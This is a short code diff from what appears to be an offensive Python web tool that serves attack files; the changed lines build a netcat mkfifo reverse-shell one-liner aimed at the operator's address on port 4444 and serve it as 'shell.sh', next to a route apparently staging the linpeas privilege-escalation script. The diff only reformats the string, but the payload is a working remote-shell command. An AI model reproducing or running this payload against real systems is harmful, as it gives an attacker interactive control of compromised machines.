@@ -70,7 +70,7 @@ def linpeas():
 @api.route('/shell.sh')
 def shell():
     shellFile = open(SHELL_PATH, "w")
-    shellFile.writelines("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + args.address + " 4444 >/tmp/f")
+    shellFile.writelines("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} 4444 >/tmp/f".format(args.address))
     shellFile.close()
     return send_file(SHELL_PATH)
 
